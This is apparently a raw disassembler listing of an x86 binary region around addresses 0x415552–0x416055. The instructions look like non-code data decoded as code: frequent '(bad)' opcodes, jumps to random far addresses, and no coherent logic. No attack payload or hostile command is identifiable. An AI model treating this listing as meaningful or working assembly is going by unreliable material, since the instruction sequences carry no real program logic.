  415552:	fldcw  WORD PTR fs:[edx]
  415555:	or     ch,bl
  415557:	out    dx,eax
  415558:	loop   0x415549
  41555a:	adc    bh,bh
  41555c:	jmp    0xc8c3a121
  415561:	js     0x415599
  415563:	in     eax,0x70
  415565:	xor    BYTE PTR es:[edx-0x78],dh
  415569:	adc    al,BYTE PTR [edi+0xd5fd0b]
	...
  4155d3:	add    BYTE PTR [eax],al
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155b1
  4155e3:	scas   eax,DWORD PTR es:[edi]
  4155e4:	stos   BYTE PTR es:[edi],al
  4155e5:	jge    0x41564e
  4155e7:	out    0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR [ebp+0x52],al
  4155f0:	nop
  4155f1:	dec    esi
  4155f2:	mov    bl,BYTE PTR [esi+eax*4+0x42]
  4155f6:	xchg   ecx,eax
  4155f7:	and    al,0x78
  4155f9:	ins    BYTE PTR es:[edi],dx
  4155fa:	bound  edx,QWORD PTR [ecx]
  4155fc:	sbb    ah,BYTE PTR [edi]
  4155fe:	mov    WORD PTR [ebx-0x59],fs
  415601:	fnstcw WORD PTR [esi+0x18]
  415604:	adc    DWORD PTR [ebx],esp
  415606:	jle    0x4155d3
  415608:	cmp    ch,BYTE PTR [edx-0x79]
  41560b:	repz mov esp,0xe925f9f4
  415611:	dec    edx
  415612:	call   0x122c:0x8bce174f
  415619:	nop
  41561a:	mov    BYTE PTR [edi+ecx*2+0x6cd4f032],bl
  415621:	jg     0x415661
  415623:	into   
  415624:	jle    0x41566d
  415626:	lods   al,BYTE PTR ds:[esi]
  415627:	mov    dh,0x43
  415629:	push   ecx
  41562a:	or     eax,0x1bf7b5e3
  41562f:	adc    eax,0xdb95e1a3
  415634:	xchg   edi,eax
  415635:	pop    ss
  415636:	loop   0x4156b5
  415638:	dec    ecx
  415639:	clc    
  41563a:	mov    ecx,0x7fbe7bf7
  41563f:	xchg   edi,eax
  415640:	cmp    ecx,DWORD PTR [ebx-0x1d]
  415643:	jl     0x4155d8
  415645:	jae    0x4155fc
  415647:	and    al,0xe3
  415649:	and    al,0xff
  41564b:	dec    eax
  41564c:	push   cs
  41564d:	adc    al,0xf2
  41564f:	std    
  415650:	or     ecx,edx
  415652:	lahf   
  415653:	out    dx,al
  415654:	add    ebx,ebp
  415656:	in     al,0xfa
  415658:	jmp    0xa3bd:0x6635ba3
  41565f:	sbb    BYTE PTR [edx-0x23],ah
  415662:	jg     0x415619
  415664:	pushf  
  415665:	fnstsw WORD PTR [ebx]
  415667:	jae    0x4156d6
  415669:	and    DWORD PTR [eax],esp
  41566b:	add    esi,DWORD PTR [eax]
  41566d:	push   ss
  41566e:	inc    edx
  41566f:	popf   
  415670:	pop    edi
  415671:	cmp    BYTE PTR [edi-0x67802dae],ah
  415677:	mov    ah,0x25
  415679:	les    edi,FWORD PTR [eax+eax*8]
  41567c:	pop    edx
  41567d:	loope  0x41567f
  41567f:	sbb    DWORD PTR [esi*1+0x2cf4db41],edi
  415686:	leave  
  415687:	cwde   
  415688:	lods   al,BYTE PTR ds:[esi]
  415689:	(bad)  
  41568a:	push   ebx
  41568b:	xor    dl,BYTE PTR [edx-0x67]
  41568e:	(bad)  
  41568f:	mov    bh,0xbd
  415691:	xor    eax,0x8ead1572
  415696:	imul   eax,DWORD PTR [esi+0x57],0xb771f68d
  41569d:	jecxz  0x41570e
  41569f:	cmp    dl,cl
  4156a1:	mov    cl,0xbb
  4156a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156a4:	fs addr16 mov eax,0xd5ab9bd8
  4156ab:	jg     0x41563a
  4156ad:	and    DWORD PTR [ebx+esi*8-0x4843c33a],eax
  4156b4:	fnstenv ds:0xdae96e4f
  4156ba:	or     al,0x23
  4156bc:	pmulhuw mm2,QWORD PTR [si]
  4156c0:	aas    
  4156c1:	xchg   edi,eax
  4156c2:	clc    
  4156c3:	(bad)  
  4156c4:	cmp    al,0x4b
  4156c6:	ins    BYTE PTR es:[edi],dx
  4156c7:	mov    eax,ds:0x41c7685b
  4156cc:	int3   
  4156cd:	sub    DWORD PTR [esp+edx*8+0x7eebaff2],esp
  4156d4:	lods   eax,DWORD PTR ds:[esi]
  4156d5:	pop    ss
  4156d6:	xor    edi,ebp
  4156d8:	inc    edi
  4156d9:	scas   eax,DWORD PTR es:[edi]
  4156da:	sub    DWORD PTR [ebp-0x62b95e42],edx
  4156e0:	retf   
  4156e1:	push   DWORD PTR [ebx+edx*2-0x4e]
  4156e5:	jnp    0x41571d
  4156e7:	pop    ds
  4156e8:	(bad)  
  4156e9:	or     al,0x76
  4156eb:	mov    ebp,0xa755
	...
  415754:	add    BYTE PTR [eax],al
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x89
  415763:	sbb    al,0xd0
  415765:	out    dx,eax
  415766:	addr16 out 0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    dl,ch
  41576f:	fstp   DWORD PTR [ebx]
  415771:	push   ss
  415772:	int3   
  415773:	xchg   edi,eax
  415774:	jmp    0x415709
  415776:	cdq    
  415777:	lods   al,BYTE PTR ds:[esi]
  415778:	and    ecx,DWORD PTR [ebp-0x1c]
  41577b:	test   dl,0xe7
  41577e:	mov    bh,0x7f
  415780:	pushf  
  415781:	push   0xf90e13b8
  415786:	or     dl,BYTE PTR [esi+0x753031b1]
  41578c:	adc    BYTE PTR [edx],dl
  41578e:	jmp    0xeee7:0xd7c75f79
  415795:	fucomp st(6)
  415797:	mov    edi,0xa80b283
  41579c:	rol    ebx,0x14
  41579f:	inc    esi
  4157a0:	cs mov al,ch
  4157a3:	daa    
  4157a4:	scas   eax,DWORD PTR es:[edi]
  4157a5:	sbb    cl,BYTE PTR [eax+0x3836353e]
  4157ab:	jecxz  0x4157e0
  4157ad:	cmp    cl,BYTE PTR [edx]
  4157af:	and    al,0x26
  4157b1:	adc    eax,0xed09a725
  4157b6:	fld    TBYTE PTR [ecx+0x62e654a9]
  4157bc:	aaa    
  4157bd:	cmp    DWORD PTR [eax],0xee62e5f0
  4157c3:	add    al,0xbb
  4157c5:	lds    esp,FWORD PTR es:[ebx-0x57150f72]
  4157cc:	adc    DWORD PTR ds:0xa3e3b536,esp
  4157d2:	dec    ebx
  4157d3:	fdivr  DWORD PTR [eax+ecx*8-0xa65c470]
  4157da:	cdq    
  4157db:	sbb    BYTE PTR [ecx-0x503ce0a4],ah
  4157e1:	(bad)  
  4157e2:	cmp    DWORD PTR [ebp-0x4],edx
  4157e5:	push   esi
  4157e6:	std    
  4157e7:	mov    edx,0xded913c2
  4157ec:	sbb    BYTE PTR [edx-0x6d],ah
  4157ef:	and    esi,DWORD PTR [eax]
  4157f1:	stos   DWORD PTR es:[edi],eax
  4157f2:	jecxz  0x415844
  4157f4:	push   0x3fe1e669
  4157f9:	aam    0xe9
  4157fb:	gs mov esp,0xfbd22a80
  415801:	das    
  415802:	lahf   
  415803:	cmp    dl,BYTE PTR [edx+ebp*2+0x48]
  415807:	mov    bh,BYTE PTR [ebx+0x76]
  41580a:	and    DWORD PTR [ecx+0x65b3bbab],ebp
  415810:	cmp    esi,edx
  415812:	std    
  415813:	fld    DWORD PTR [ebp-0x44057b86]
  415819:	(bad)
  41581c:	jmp    0x9d3b:0x796e7205
  415823:	sti    
  415824:	rcr    BYTE PTR [esi+0x43082a8d],0xb5
  41582b:	dec    eax
  41582c:	pop    eax
  41582d:	mov    ds:0xd1ccd969,eax
  415832:	out    0x9c,eax
  415834:	fidivr WORD PTR [ebx+eax*4-0x7]
  415838:	add    edx,eax
  41583a:	fld    TBYTE PTR [ecx+0x75]
  41583d:	xchg   esp,eax
  41583e:	out    0x99,eax
  415840:	clc    
  415841:	mov    bh,0x47
  415843:	rcl    BYTE PTR [esi+0x131ad109],0x1f
  41584a:	cmp    ebx,DWORD PTR [ebx-0x3f]
  41584d:	fst    QWORD PTR [ebp+0xe2d6103]
  415853:	shr    DWORD PTR [ecx],cl
  415855:	mov    eax,ds:0x8852c2f8
  41585a:	mov    edi,0x900d47db
  41585f:	sbb    dl,0x6e
  415862:	sub    dl,BYTE PTR [edx+0x112a1c3b]
  415868:	mov    eax,ds:0x867f1ec2
  41586d:	adc    DWORD PTR [eax],eax
	...
  4158d3:	add    BYTE PTR [eax],al
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcl    DWORD PTR [ebx+0x72],cl
  4158e4:	int    0x13
  4158e6:	addr16 call 0x14158ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	sbb    bh,0xb0
  4158f1:	imul   ebp,DWORD PTR [ebx],0x5da80cf6
  4158f7:	repz scas al,BYTE PTR es:[edi]
  4158f9:	fisttp QWORD PTR [ecx]
  4158fb:	or     ebp,ecx
  4158fd:	jae    0x4158ad
  4158ff:	nop
  415900:	js     0x415939
  415902:	sahf   
  415903:	mov    ds:0xe71704a6,eax
  415908:	enter  0x7452,0x38
  41590c:	test   al,0x62
  41590e:	and    ebx,0x95bd03db
  415914:	data16 mov bl,0xd5
  415917:	and    BYTE PTR [edx],0xe1
  41591a:	into   
  41591b:	mov    BYTE PTR [edx],cl
  41591d:	push   esp
  41591e:	(bad)  
  41591f:	cwde   
  415920:	and    ah,BYTE PTR [ebx+0x593d9d65]
  415926:	aam    0x41
  415928:	adc    DWORD PTR [edx],eax
  41592a:	pop    edx
  41592b:	jecxz  0x41593f
  41592d:	retf   
  41592e:	imul   edi,DWORD PTR [edx+0x50],0x1f4a1e6e
  415935:	shr    DWORD PTR [ebp+0x15],0x1b
  415939:	mov    DWORD PTR [ecx+eax*2-0x27],ebp
  41593d:	xor    edx,DWORD PTR [ebp+0xb53210]
  415943:	push   0x3c
  415945:	cwde   
  415946:	jb     0x4158df
  415948:	cwde   
  415949:	les    edi,FWORD PTR [ebx+0x1afced78]
  41594f:	mov    ss,edi
  415951:	enter  0xc3da,0xdd
  415955:	dec    edx
  415956:	into   
  415957:	hlt    
  415958:	js     0x4159d9
  41595a:	aaa    
  41595b:	mov    bl,0x6e
  41595d:	xlat   BYTE PTR ds:[ebx]
  41595e:	ja     0x415987
  415960:	js     0x415946
  415962:	retf   0xa3d2
  415965:	and    al,0xb5
  415967:	test   DWORD PTR [esi+0x688e04e9],ecx
  41596d:	popa   
  41596e:	jp     0x415945
  415970:	adc    edx,ebx
  415972:	or     ebp,DWORD PTR [edi-0x6a]
  415975:	iret   
  415976:	outs   dx,BYTE PTR ds:[esi]
  415977:	(bad)  
  415979:	mov    al,0xbe
  41597b:	push   esp
  41597c:	idiv   esi
  41597e:	xchg   ecx,eax
  41597f:	hlt    
  415980:	lock stos DWORD PTR es:[edi],eax
  415982:	in     al,dx
  415983:	xchg   esp,eax
  415984:	pop    ebx
  415985:	jns    0x4159cb
  415987:	xor    BYTE PTR ds:0xcc16f243,al
  41598d:	rcl    BYTE PTR [esi+0x6],1
  415990:	bound  ecx,QWORD PTR [esi-0x2f2adeed]
  415996:	jae    0x4159fd
  415998:	mov    al,0xfb
  41599a:	arpl   WORD PTR [ecx+0x7400396e],si
  4159a0:	ins    DWORD PTR es:[edi],dx
  4159a1:	xchg   DWORD PTR [esi],ebx
  4159a3:	jne    0x4159ea
  4159a5:	call   0x87ce:0x81d46100
  4159ac:	loopne 0x415956
  4159ae:	out    0xb2,eax
  4159b0:	es jge 0x415943
  4159b3:	hlt    
  4159b4:	cmp    BYTE PTR [esi+esi*1-0x3a],cl
  4159b8:	mov    ds:0xc1317284,eax
  4159bd:	inc    edi
  4159be:	fld    DWORD PTR ds:[ecx]
  4159c1:	xchg   esp,eax
  4159c2:	pop    esi
  4159c3:	or     al,bl
  4159c5:	jb     0x415a00
  4159c7:	retf   0xae4f
  4159ca:	jg     0x4159a7
  4159cc:	std    
  4159cd:	loope  0x4159a9
  4159cf:	mov    edi,0x717bc548
  4159d4:	inc    esp
  4159d5:	enter  0x172e,0x52
  4159d9:	adc    DWORD PTR [edi-0x3d],eax
  4159dc:	dec    esi
  4159dd:	xor    DWORD PTR [eax-0x41025bb3],0xfdc7c009
  4159e7:	stos   DWORD PTR es:[edi],eax
  4159e8:	das    
  4159e9:	mov    al,0x3b
  4159eb:	jle    0x4159ed
  4159ed:	pop    ebx
	...
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	icebp  
  415a63:	je     0x415a1d
  415a65:	imul   esp,DWORD PTR [edi-0x17],0x0
  415a69:	add    BYTE PTR [eax],al
  415a6b:	add    DWORD PTR [eax],eax
  415a6d:	add    BYTE PTR [ecx-0x2906408f],bl
  415a73:	pop    es
  415a74:	in     eax,0xe5
  415a76:	xchg   DWORD PTR ds:0x36e2aac9,edx
  415a7c:	adc    ebp,DWORD PTR [ecx+0x25207380]
  415a82:	jg     0x415aee
  415a84:	cli    
  415a85:	mov    edi,0xbce561ef
  415a8a:	mov    al,0x2d
  415a8c:	mov    ecx,DWORD PTR [ebx-0xfcbef52]
  415a92:	sbb    eax,0xba09af5
  415a97:	push   eax
  415a98:	cmp    eax,0x79d8734a
  415a9d:	xor    eax,0x209d151e
  415aa2:	loop   0x415a72
  415aa4:	push   es
  415aa5:	jmp    0xaec2:0xa9c90836
  415aac:	and    al,0xc1
  415aae:	scas   al,BYTE PTR es:[edi]
  415aaf:	and    ebx,ebp
  415ab1:	push   edi
  415ab2:	dec    ebp
  415ab3:	ret    0xd7e3
  415ab6:	out    dx,al
  415ab7:	adc    DWORD PTR [ecx+0x1b41da62],0x67992b31
  415ac1:	sub    al,0xf6
  415ac3:	ret    
  415ac4:	sbb    bh,BYTE PTR [edx+0xc689de0]
  415aca:	add    dh,BYTE PTR [ebp-0x608b995e]
  415ad0:	and    dh,dl
  415ad2:	mov    dh,0xed
  415ad4:	retf   
  415ad5:	xchg   esi,eax
  415ad6:	mov    edx,0xdca72009
  415adb:	loopne 0x415b0c
  415add:	cmc    
  415ade:	popaw  
  415ae0:	test   al,0xd
  415ae2:	push   ebp
  415ae3:	fs dec eax
  415ae5:	push   ecx
  415ae6:	inc    ecx
  415ae7:	cmp    al,0xd6
  415ae9:	xchg   esp,eax
  415aea:	mov    esi,0x6ecb64d0
  415aef:	push   ecx
  415af0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415af1:	xor    BYTE PTR [esi],dh
  415af3:	lea    esp,[ecx+0x3bc2afb1]
  415af9:	ret    0xace6
  415afc:	push   edi
  415afd:	imul   ebp
  415aff:	mov    eax,ds:0x6e1e7e75
  415b04:	or     eax,0xf1f2361c
  415b09:	not    BYTE PTR [edi+edi*4]
  415b0c:	fisubr DWORD PTR [ebx]
  415b0e:	pop    ebp
  415b0f:	fimul  DWORD PTR [ecx]
  415b11:	push   esi
  415b12:	xchg   BYTE PTR [edx-0x69],bh
  415b15:	push   edi
  415b16:	(bad)  
  415b17:	and    DWORD PTR [esi],edi
  415b19:	mov    bl,cl
  415b1b:	mov    ebp,0xcb746cd
  415b20:	jmp    0x415aac
  415b22:	leave  
  415b23:	fbstp  TBYTE PTR [eax]
  415b25:	ss retf 
  415b27:	retf   0x9d87
  415b2a:	outs   dx,BYTE PTR ds:[esi]
  415b2b:	jle    0x415abb
  415b2d:	popa   
  415b2e:	lea    ebx,[esi+0xf]
  415b31:	dec    esi
  415b32:	mov    al,0x1
  415b34:	int    0x72
  415b36:	inc    ecx
  415b37:	cmc    
  415b38:	push   edi
  415b39:	mov    ds:0xa948a83d,al
  415b3e:	jae    0x415b36
  415b40:	mov    edi,0x1dc21d1
  415b45:	or     ch,BYTE PTR [eax]
  415b47:	test   al,0x47
  415b49:	sub    al,0x68
  415b4b:	push   edx
  415b4c:	stos   DWORD PTR es:[edi],eax
  415b4d:	test   BYTE PTR [ebp-0xf],al
  415b50:	dec    esi
  415b51:	test   BYTE PTR [edi+0x6f],dl
  415b54:	ja     0x415bb7
  415b56:	mov    ds:0xbae92126,eax
  415b5b:	push   ebp
  415b5c:	pop    es
  415b5d:	loopne 0x415bc3
  415b5f:	cmp    eax,0xe9f4eecc
  415b64:	fisttp DWORD PTR [ebx-0x6b]
  415b67:	adc    cl,BYTE PTR [ecx+0xad6d90b]
  415b6d:	or     BYTE PTR [eax],al
	...
  415bd3:	add    BYTE PTR [eax],al
  415bd5:	add    bh,bl
  415bd7:	mov    esi,0xbb659205
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	(bad)  
  415be3:	pusha  
  415be4:	dec    esi
  415be5:	jnp    0x415c4e
  415be7:	jmp    0x0:0x1000000
  415bee:	lods   eax,DWORD PTR ds:[esi]
  415bef:	pop    es
  415bf0:	jle    0x415c6b
  415bf2:	inc    edi
  415bf3:	jp     0x415c2a
  415bf5:	mov    al,ds:0x923040ab
  415bfa:	sub    eax,0x474ebb2
  415bff:	push   esp
  415c00:	hlt    
  415c01:	and    ah,BYTE PTR [edx+0x43830751]
  415c07:	dec    edi
  415c08:	test   eax,0xcf8114b0
  415c0d:	push   ecx
  415c0e:	sbb    cl,dl
  415c10:	jmp    0xb4ebe0ed
  415c15:	sahf   
  415c16:	in     eax,0x63
  415c18:	mov    ah,0x47
  415c1a:	mov    dl,BYTE PTR [esi]
  415c1c:	push   edi
  415c1d:	xlat   BYTE PTR ds:[ebx]
  415c1e:	test   al,0x8c
  415c20:	jbe    0x415c91
  415c22:	inc    edx
  415c23:	xor    al,0x85
  415c25:	in     eax,dx
  415c26:	adc    al,0x68
  415c28:	cmp    dh,cl
  415c2a:	sbb    eax,DWORD PTR [ebx+0x39]
  415c2d:	xchg   esi,eax
  415c2e:	sbb    eax,0x727a9c28
  415c33:	test   eax,0xa64e6818
  415c38:	es nop
  415c3a:	fisubr DWORD PTR [ebp+0x46]
  415c3d:	and    BYTE PTR [esi],al
  415c3f:	imul   ebp,DWORD PTR [esi+0x20],0xffffffba
  415c43:	mov    BYTE PTR [edx+0x3a],cl
  415c46:	push   ebp
  415c47:	cmp    BYTE PTR [edi+eiz*8+0x6cc83076],0x23
  415c4f:	xchg   esi,eax
  415c50:	loope  0x415cc7
  415c52:	sbb    dl,BYTE PTR [edi-0x2d]
  415c55:	push   esp
  415c56:	xchg   edi,eax
  415c57:	mov    cl,0xef
  415c59:	sbb    DWORD PTR [ebx-0x2e],edx
  415c5c:	jns    0x415cd9
  415c5e:	add    BYTE PTR [eax+ebx*1-0x1c],0x3c
  415c63:	cs inc eax
  415c65:	inc    edx
  415c66:	fidiv  WORD PTR ds:[ecx+esi*1+0x7446d371]
  415c6e:	std    
  415c6f:	loopne 0x415c20
  415c71:	dec    eax
  415c72:	outs   dx,BYTE PTR ds:[esi]
  415c73:	push   es
  415c74:	sub    BYTE PTR [ebx],bh
  415c76:	sahf   
  415c77:	aas    
  415c78:	mov    cl,0x6a
  415c7a:	shr    ah,0x42
  415c7d:	mov    eax,0x86b1e7b8
  415c82:	mov    ebp,0x108e8fc9
  415c87:	test   BYTE PTR [ebp-0x1a6a8e58],al
  415c8d:	sbb    DWORD PTR [esi+0x2abced99],0xdb35201a
  415c97:	or     BYTE PTR [eax+0x66b8d525],al
  415c9d:	xchg   edi,eax
  415c9e:	cdq    
  415c9f:	aad    0xe0
  415ca1:	in     eax,dx
  415ca2:	xor    eax,0xc6e92276
  415ca7:	push   cs
  415ca8:	loope  0x415d1c
  415caa:	xor    ebp,DWORD PTR [ebx+0x3d5172a]
  415cb0:	xor    al,0x7f
  415cb2:	xchg   ecx,eax
  415cb3:	ins    DWORD PTR es:[edi],dx
  415cb4:	push   eax
  415cb5:	jmp    0x5470c531
  415cba:	push   edx
  415cbb:	dec    eax
  415cbc:	shl    bl,1
  415cbe:	xchg   ebx,eax
  415cbf:	ds sub ebx,esi
  415cc2:	sar    BYTE PTR [eax],cl
  415cc4:	jns    0x415cfa
  415cc6:	jge    0x415cdd
  415cc8:	sbb    DWORD PTR [eax-0x7fb24aaf],edx
  415cce:	loope  0x415ce4
  415cd0:	inc    esp
  415cd1:	jns    0x415d47
  415cd3:	les    ebp,FWORD PTR [ecx-0x11]
  415cd6:	sub    esi,DWORD PTR [esi+0x73312da4]
  415cdc:	mov    eax,ds:0xd308daf
  415ce1:	jns    0x415c76
  415ce3:	inc    eax
  415ce4:	xor    eax,0x3bfe6cc
  415ce9:	dec    ebp
  415cea:	pop    ss
  415ceb:	adc    BYTE PTR [edx+0x79],bh
	...
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x32a0ee1f
  415d65:	(bad)  
  415d66:	addr16 jmp 0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    bl,bh
  415d6f:	pop    ebx
  415d70:	xchg   ebx,eax
  415d71:	js     0x415da1
  415d73:	mov    dh,0xd0
  415d75:	in     al,dx
  415d76:	jb     0x415d08
  415d78:	nop
  415d79:	push   ds
  415d7a:	sbb    dh,BYTE PTR [esi+0x6a]
  415d7d:	test   eax,0x604dc68d
  415d82:	add    eax,0xfe3607d
  415d87:	push   esi
  415d88:	and    eax,0xb357e9aa
  415d8d:	and    BYTE PTR [eax+0x2fe2ed2c],dh
  415d93:	mov    ebx,DWORD PTR [eax+ecx*4]
  415d96:	pop    ebx
  415d97:	es hlt 
  415d99:	sub    ax,WORD PTR [eax-0x7b061fd2]
  415da0:	jle    0x415dec
  415da2:	das    
  415da3:	mov    ah,0x60
  415da5:	mov    dh,0x6b
  415da7:	sub    BYTE PTR [ebx+0x1],cl
  415daa:	das    
  415dab:	fs pop esp
  415dad:	push   eax
  415dae:	pop    esi
  415daf:	xor    ecx,DWORD PTR [ecx-0x44]
  415db2:	mov    al,0x3e
  415db4:	push   ebx
  415db5:	sbb    DWORD PTR [ebx-0x14],0x5a
  415db9:	pop    esp
  415dba:	loopne 0x415d83
  415dbc:	fld    QWORD PTR [edi]
  415dbe:	inc    esi
  415dbf:	lock ins DWORD PTR es:[edi],dx
  415dc1:	ret    0xf811
  415dc4:	mov    cl,0xd2
  415dc6:	adc    al,0x6
  415dc8:	adc    esi,DWORD PTR ds:0x32f84f5a
  415dce:	xchg   ebx,eax
  415dcf:	xlat   BYTE PTR ds:[ebx]
  415dd0:	cmc    
  415dd1:	out    dx,eax
  415dd2:	aas    
  415dd3:	shr    BYTE PTR [eax],0x97
  415dd6:	outs   dx,DWORD PTR ds:[esi]
  415dd7:	jmp    0x9132ab57
  415ddc:	mov    bh,0x76
  415dde:	lds    edi,FWORD PTR [ebp+0x373bd5f2]
  415de4:	int    0xbf
  415de6:	cmp    DWORD PTR [edx],eax
  415de8:	dec    edx
  415de9:	jmp    0x441d:0x7dfd1d31
  415df0:	add    DWORD PTR ds:0x6dc5ce56,edi
  415df6:	idiv   BYTE PTR [ecx-0x7fb15b4b]
  415dfc:	add    DWORD PTR [esi],edi
  415dfe:	call   0xe6ea:0xaef017cc
  415e05:	push   edx
  415e06:	cmp    DWORD PTR [ebx],ecx
  415e08:	adc    ebx,DWORD PTR [esi+0x32]
  415e0b:	aas    
  415e0c:	mov    ecx,0x5fa07d98
  415e11:	xor    BYTE PTR [eax],0x18
  415e14:	js     0x415e8e
  415e16:	stos   DWORD PTR es:[edi],eax
  415e17:	and    al,0xaf
  415e19:	iret   
  415e1a:	jb     0x415e29
  415e1c:	call   DWORD PTR [ebx-0x410f8779]
  415e22:	jp     0x415dee
  415e24:	outs   dx,DWORD PTR ds:[esi]
  415e25:	mov    ebx,ebx
  415e27:	push   ds
  415e28:	pop    es
  415e29:	mov    ah,0x8
  415e2b:	fstp   TBYTE PTR [esi-0x51a2f185]
  415e31:	cmp    dl,BYTE PTR [ecx+0x4f]
  415e34:	inc    esi
  415e35:	stos   BYTE PTR es:[edi],al
  415e36:	es call 0xea620206
  415e3c:	retf   
  415e3d:	les    eax,FWORD PTR [ecx+0x33503cee]
  415e43:	imul   eax,ecx,0x2bb74d89
  415e49:	dec    eax
  415e4a:	or     DWORD PTR [eax+0x1c],esi
  415e4d:	adc    al,0x39
  415e4f:	push   ss
  415e50:	ins    BYTE PTR es:[edi],dx
  415e51:	or     cl,bl
  415e53:	pop    ebx
  415e54:	fisub  WORD PTR [edx-0x77611735]
  415e5a:	std    
  415e5b:	gs jns 0x415edc
  415e5e:	leave  
  415e5f:	int    0x2b
  415e61:	in     al,0x67
  415e63:	push   0x5d983f03
  415e68:	dec    edi
  415e69:	mov    edx,0x16f926ec
	...
  415ed6:	out    dx,al
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x17]
  415ee3:	mov    ecx,0xec67be06
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	xchg   ebp,eax
  415eef:	inc    esp
  415ef0:	bound  ecx,QWORD PTR [edi-0x3e]
  415ef3:	or     eax,0xe6348911
  415ef8:	mov    ch,0xc0
  415efa:	dec    edi
  415efb:	test   eax,0x43c63d8b
  415f00:	push   ecx
  415f01:	cld    
  415f02:	fnstcw WORD PTR [edi-0x7ee93d54]
  415f08:	fst    DWORD PTR [edi-0x5357b977]
  415f0e:	repnz (bad) 
  415f10:	sbb    eax,0x16b82978
  415f15:	mov    ah,0x34
  415f17:	out    0x80,eax
  415f19:	sub    esp,DWORD PTR [edx]
  415f1b:	fwait
  415f1c:	test   eax,0xb6cc1f94
  415f21:	jmp    0x415f20
  415f23:	mov    edx,0x4b70afe3
  415f28:	icebp  
  415f29:	adc    bh,BYTE PTR [edi-0x3c]
  415f2c:	aas    
  415f2d:	inc    esp
  415f2e:	pushf  
  415f2f:	push   edi
  415f30:	xchg   BYTE PTR [ebp-0x2f8112a7],ah
  415f36:	xor    eax,DWORD PTR [esi+0x1e]
  415f39:	jae    0x415f8e
  415f3b:	inc    edx
  415f3c:	arpl   WORD PTR [edi-0x21],sp
  415f3f:	cmp    al,0xde
  415f41:	sbb    DWORD PTR [eax-0x54],0xf6a3135f
  415f48:	shl    DWORD PTR [eax],1
  415f4a:	adc    dl,BYTE PTR [edi]
  415f4c:	and    ecx,DWORD PTR [edi-0x23d5f3a2]
  415f52:	sub    DWORD PTR [edx+0x6a3f7f3b],esp
  415f58:	fwait
  415f59:	jae    0x415fcd
  415f5b:	jl     0x415f6f
  415f5d:	stos   BYTE PTR es:[edi],al
  415f5e:	adc    bh,ah
  415f60:	jb     0x415f97
  415f62:	pop    ebx
  415f63:	inc    ebx
  415f64:	pop    esi
  415f65:	push   es
  415f66:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415f68:	mov    esp,0x79c30247
  415f6d:	rcl    DWORD PTR [ecx],0x9b
  415f70:	lock leave 
  415f72:	cwde   
  415f73:	adc    dl,al
  415f75:	fcomp  QWORD PTR [esi]
  415f77:	mov    eax,0x905a4575
  415f7c:	mov    ah,0xee
  415f7e:	dec    ecx
  415f7f:	mov    ch,0x44
  415f81:	inc    ebx
  415f82:	sar    BYTE PTR [eax+0x49ea7524],1
  415f88:	addr16 or al,0x39
  415f8b:	cmp    DWORD PTR [ebp+0x2c],0x23
  415f8f:	inc    ebp
  415f90:	das    
  415f91:	or     al,0x65
  415f93:	xor    bh,al
  415f95:	mov    ch,0xc7
  415f97:	pop    ecx
  415f98:	add    eax,0xe73dcc12
  415f9d:	xor    bh,dh
  415f9f:	or     bh,cl
  415fa1:	in     al,0x93
  415fa3:	add    DWORD PTR [edi+0x2bc788eb],esp
  415fa9:	ins    BYTE PTR es:[edi],dx
  415faa:	mov    bl,0xb1
  415fac:	stc    
  415fad:	in     eax,dx
  415fae:	sub    ax,0x63b5
  415fb2:	add    esp,eax
  415fb4:	jbe    0x415fa7
  415fb6:	lds    ebx,FWORD PTR [esi]
  415fb8:	jno    0x415ffe
  415fba:	out    0x33,eax
  415fbc:	mov    ch,0x3e
  415fbe:	mov    ebx,0x6228a734
  415fc3:	xchg   DWORD PTR [edx*2-0x34e695d2],esp
  415fca:	cwde   
  415fcb:	sbb    ecx,esp
  415fcd:	xor    al,ah
  415fcf:	popa   
  415fd0:	retf   
  415fd1:	outs   dx,BYTE PTR ds:[esi]
  415fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd4:	mov    al,dl
  415fd6:	and    BYTE PTR [edi+0x29],bh
  415fd9:	rol    DWORD PTR [ebp-0x3d],0xb1
  415fdd:	aad    0x1f
  415fdf:	mov    ecx,0x59ae0804
  415fe4:	or     ebp,DWORD PTR [edi+0x765b9f9e]
  415fea:	sub    DWORD PTR [edi-0xd],esp
  415fed:	sbb    eax,DWORD PTR [eax]
	...
  416053:	add    BYTE PTR [eax],al
  416055:	add    BYTE PTR [edi],dl
